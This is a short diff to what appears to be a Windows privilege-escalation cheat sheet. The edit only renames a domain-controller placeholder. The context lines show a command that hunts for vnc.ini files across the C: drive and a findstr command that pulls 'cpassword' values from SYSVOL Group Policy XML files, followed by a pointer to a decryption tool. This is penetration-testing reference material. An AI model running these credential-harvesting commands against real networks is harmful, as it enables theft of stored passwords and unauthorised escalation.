@@ -176,9 +176,9 @@ dir c:\ /s /b | findstr /si *vnc.ini
 ### Group Policy Preference
 - Included in PowerSploit/PowerUp (https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
 
-1. Look for *Groups.xml* files inside \\<dc_fqdn>\SYSVOL
+1. Look for *Groups.xml* files inside \\<dc>\SYSVOL
 ```
-findstr /S /I cpassword \\<dc_fqdn>\SYSVOL\<dc_fqdn>\policies\*.xml
+findstr /S /I cpassword \\<dc>\SYSVOL\<dc>\policies\*.xml
 ```
 
 2. Crack them with https://github.com/BustedSec/gpp-decrypt
